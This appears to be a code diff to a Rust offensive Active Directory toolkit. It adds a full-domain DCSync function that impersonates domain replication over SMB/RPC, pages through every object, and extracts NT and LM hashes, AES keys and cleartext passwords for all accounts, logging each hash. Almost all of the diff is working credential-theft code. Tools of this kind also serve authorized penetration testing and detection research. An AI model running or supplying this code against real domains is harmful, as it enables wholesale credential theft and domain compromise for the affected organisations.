@@ -513,6 +513,219 @@ fn build_drs_get_nc_changes(handle: &[u8], object_dn: &str, _nc_dn: &str) -> Vec
     build_rpc_request_pdu(3, &stub) // opnum 3 = DRSGetNCChanges
 }
 
+/// Cursor for DRSGetNCChanges pagination.
+#[derive(Debug, Clone, Default)]
+struct DcSyncCursor {
+    uuid_invoc_id_src: [u8; 16],
+    usnvec_to: [u64; 3],
+}
+
+/// Build DRSGetNCChanges request (opnum 3) for full-domain replication
+///
+/// Unlike the single-object variant, this does NOT set EXOP_REPL_OBJ,
+/// uses `base_dn` as the replicating DN, and requests up to 500 objects.
+///
+/// When `cursor` is `Some`, sets `uuidInvocIdSrc` and `usnvecFrom` from
+/// the previous response's cursor to continue replication from where we left off.
+fn build_drs_get_nc_changes_domain(
+    handle: &[u8],
+    base_dn: &str,
+    cursor: Option<&DcSyncCursor>,
+) -> Vec<u8> {
+    let mut stub = Vec::with_capacity(512);
+
+    stub.extend_from_slice(handle);
+
+    stub.extend_from_slice(&8u32.to_le_bytes());
+
+    let dest_uuid: [u8; 16] = rand::random();
+    stub.extend_from_slice(&dest_uuid);
+    // uuidInvocIdSrc — use cursor if provided
+    if let Some(c) = cursor {
+        stub.extend_from_slice(&c.uuid_invoc_id_src);
+    } else {
+        stub.extend_from_slice(&[0u8; 16]);
+    }
+    stub.extend_from_slice(&1u32.to_le_bytes());
+    // usnvecFrom — use cursor if provided
+    if let Some(c) = cursor {
+        stub.extend_from_slice(&c.usnvec_to[0].to_le_bytes());
+        stub.extend_from_slice(&c.usnvec_to[1].to_le_bytes());
+        stub.extend_from_slice(&c.usnvec_to[2].to_le_bytes());
+    } else {
+        stub.extend_from_slice(&[0u8; 24]);
+    }
+    stub.extend_from_slice(&0u32.to_le_bytes());
+
+    let flags =
+        DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
+    stub.extend_from_slice(&flags.to_le_bytes());
+    stub.extend_from_slice(&500u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+
+    let nc_utf16: Vec<u8> = base_dn
+        .encode_utf16()
+        .chain(std::iter::once(0u16))
+        .flat_map(|c| c.to_le_bytes())
+        .collect();
+    let name_char_count = (base_dn.len() + 1) as u32;
+    let struct_len: u32 = 4 + 4 + 16 + 28 + 4 + nc_utf16.len() as u32;
+
+    stub.extend_from_slice(&struct_len.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&[0u8; 16]);
+    stub.extend_from_slice(&[0u8; 28]);
+    stub.extend_from_slice(&name_char_count.to_le_bytes());
+    stub.extend_from_slice(&name_char_count.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&name_char_count.to_le_bytes());
+    stub.extend_from_slice(&nc_utf16);
+
+    while !stub.len().is_multiple_of(4) {
+        stub.push(0);
+    }
+
+    build_rpc_request_pdu(3, &stub)
+}
+
+/// Perform full-domain DCSync — replicate all objects in the domain NC.
+///
+/// This is the equivalent of `dcsync_single_user` but without the
+/// EXOP_REPL_OBJ flag, replicating every object in the domain.
+///
+/// Returns both the `ForgeResult` for display and the raw `Vec<DcSyncSecrets>`
+/// for programmatic consumption (e.g., by the ntds-dump module).
+pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, ForgeResult)> {
+    let realm = config.domain.to_uppercase();
+    let base_dn = realm
+        .split('.')
+        .map(|p| format!("DC={p}"))
+        .collect::<Vec<_>>()
+        .join(",");
+
+    let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;
+
+    info!(
+        "[dcsync-full] Connecting to DC via SMB → \\\\{}\\IPC$",
+        config.dc_ip
+    );
+    let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass)
+        .await
+        .map_err(|e| OverthroneError::Smb(format!("SMB connect failed: {e}")))?;
+
+    let smb_session_key = smb.session_key().unwrap_or_default();
+    info!("[dcsync-full] {} SMB session established", "✓".green());
+
+    let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
+    let bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &bind_pdu)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("RPC bind failed: {e}")))?;
+    validate_rpc_bind_ack(&bind_resp)?;
+    info!("[dcsync-full] {} RPC bind accepted", "✓".green());
+
+    let drs_bind_req = build_drs_bind_request();
+    let drs_bind_resp = pipe_transact_reassemble(&smb, "drsuapi", &drs_bind_req)
+        .await
+        .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;
+    let (drs_handle, _server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
+    info!("[dcsync-full] {} DRSBind done", "✓".green());
+
+    let drs_session_key = compute_drs_session_key(&smb_session_key, &nt_hash_bytes)?;
+
+    let mut all_secrets: Vec<DcSyncSecrets> = Vec::new();
+    let mut cursor: Option<DcSyncCursor> = None;
+    let mut pages = 0u32;
+
+    loop {
+        pages += 1;
+        info!(
+            "[dcsync-full] Page {} — requesting next 500 objects from {}",
+            pages, realm
+        );
+
+        let gnc_req = build_drs_get_nc_changes_domain(&drs_handle, &base_dn, cursor.as_ref());
+        let gnc_resp = pipe_transact_reassemble(&smb, "drsuapi", &gnc_req)
+            .await
+            .map_err(|e| OverthroneError::custom(format!("DRSGetNCChanges failed: {e}")))?;
+
+        let page_secrets =
+            parse_dcsync_response_with_cursor(&gnc_resp, &drs_session_key, &realm, &mut cursor);
+        let page_count = page_secrets.len();
+        all_secrets.extend(page_secrets);
+
+        info!(
+            "[dcsync-full] Page {} returned {} credentials",
+            pages, page_count
+        );
+
+        let has_more = cursor
+            .as_ref()
+            .map(|c| c.uuid_invoc_id_src != [0u8; 16])
+            .unwrap_or(false);
+
+        if !has_more || page_count == 0 {
+            info!(
+                "[dcsync-full] No more pages — stopping after page {}",
+                pages
+            );
+            break;
+        }
+
+        // Safety valve: max 100 pages (50,000 objects)
+        if pages >= 100 {
+            warn!("[dcsync-full] Reached max 100 pages — truncating");
+            break;
+        }
+    }
+
+    let unbind_req = build_drs_unbind(&drs_handle);
+    let _ = smb.pipe_transact("drsuapi", &unbind_req).await;
+
+    let extracted = all_secrets.len();
+    let success = extracted > 0;
+
+    for s in &all_secrets {
+        info!(
+            "  {} {} → NT: {}",
+            "✓".green(),
+            s.username.bold(),
+            s.nt_hash.as_deref().unwrap_or("N/A").red()
+        );
+    }
+
+    info!(
+        "[dcsync-full] Total extracted: {} credentials across {} pages",
+        extracted, pages
+    );
+
+    let msg = format!(
+        "Full DCSync: extracted {} credential(s) from {} ({} pages)",
+        extracted, realm, pages
+    );
+
+    let forge_result = ForgeResult {
+        action: format!("DCSync (full domain: {})", realm),
+        domain: config.domain.clone(),
+        success,
+        ticket_data: None,
+        persistence_result: Some(crate::runner::PersistenceResult {
+            mechanism: "DCSync (Full Domain)".into(),
+            target: realm.clone(),
+            success,
+            details: format!(
+                "Domain-wide DCSync of {}\nDC: {}\nExtracted: {} credential(s) across {} page(s)",
+                realm, config.dc_ip, extracted, pages
+            ),
+            cleanup_command: Some("# DCSync is read-only. Monitor Event ID 4662.".into()),
+        }),
+        message: msg,
+    };
+
+    Ok((all_secrets, forge_result))
+}
+
 /// Build DRSUnbind request (opnum 1) — release context handle
 fn build_drs_unbind(handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::with_capacity(24);
@@ -595,31 +808,69 @@ fn parse_dcsync_response(resp: &[u8], session_key: &[u8], domain: &str) -> Vec<D
             result
                 .objects
                 .iter()
-                .map(|obj| DcSyncSecrets {
-                    username: obj.sam_account_name.clone(),
-                    domain: domain.to_string(),
-                    user_rid: obj.rid.unwrap_or(0),
-                    nt_hash: obj.nt_hash.as_ref().map(|h| hex_encode_bytes(h)),
-                    lm_hash: obj.lm_hash.as_ref().map(|h| hex_encode_bytes(h)),
-                    aes256_key: obj
-                        .supplemental_credentials
-                        .as_ref()
-                        .and_then(|s| s.aes256_key.as_ref().map(|h| hex_encode_bytes(h))),
-                    aes128_key: obj
-                        .supplemental_credentials
-                        .as_ref()
-                        .and_then(|s| s.aes128_key.as_ref().map(|h| hex_encode_bytes(h))),
-                    cleartext_password: obj
-                        .supplemental_credentials
-                        .as_ref()
-                        .and_then(|s| s.cleartext.clone()),
-                })
+                .map(|obj| dcsync_obj_to_secrets(obj, domain))
                 .collect()
         }
         Err(e) => {
             warn!("[dcsync] Failed to parse DRSGetNCChanges reply: {}", e);
             Vec::new()
         }
+    }
+}
+
+/// Parse DCSync response and extract pagination cursor for multi-page replication.
+fn parse_dcsync_response_with_cursor(
+    resp: &[u8],
+    session_key: &[u8],
+    domain: &str,
+    cursor: &mut Option<DcSyncCursor>,
+) -> Vec<DcSyncSecrets> {
+    match drsr::parse_get_nc_changes_reply(resp, session_key) {
+        Ok(result) => {
+            info!(
+                "[dcsync] Parser returned {} objects, more_data={}",
+                result.objects.len(),
+                result.more_data
+            );
+
+            *cursor = Some(DcSyncCursor {
+                uuid_invoc_id_src: result.uuid_invoc_id_src,
+                usnvec_to: result.usnvec_to,
+            });
+
+            result
+                .objects
+                .iter()
+                .map(|obj| dcsync_obj_to_secrets(obj, domain))
+                .collect()
+        }
+        Err(e) => {
+            warn!("[dcsync] Failed to parse DRSGetNCChanges reply: {}", e);
+            *cursor = None;
+            Vec::new()
+        }
+    }
+}
+
+fn dcsync_obj_to_secrets(obj: &drsr::ReplicatedObject, domain: &str) -> DcSyncSecrets {
+    DcSyncSecrets {
+        username: obj.sam_account_name.clone(),
+        domain: domain.to_string(),
+        user_rid: obj.rid.unwrap_or(0),
+        nt_hash: obj.nt_hash.as_ref().map(|h| hex_encode_bytes(h)),
+        lm_hash: obj.lm_hash.as_ref().map(|h| hex_encode_bytes(h)),
+        aes256_key: obj
+            .supplemental_credentials
+            .as_ref()
+            .and_then(|s| s.aes256_key.as_ref().map(|h| hex_encode_bytes(h))),
+        aes128_key: obj
+            .supplemental_credentials
+            .as_ref()
+            .and_then(|s| s.aes128_key.as_ref().map(|h| hex_encode_bytes(h))),
+        cleartext_password: obj
+            .supplemental_credentials
+            .as_ref()
+            .and_then(|s| s.cleartext.clone()),
     }
 }
 
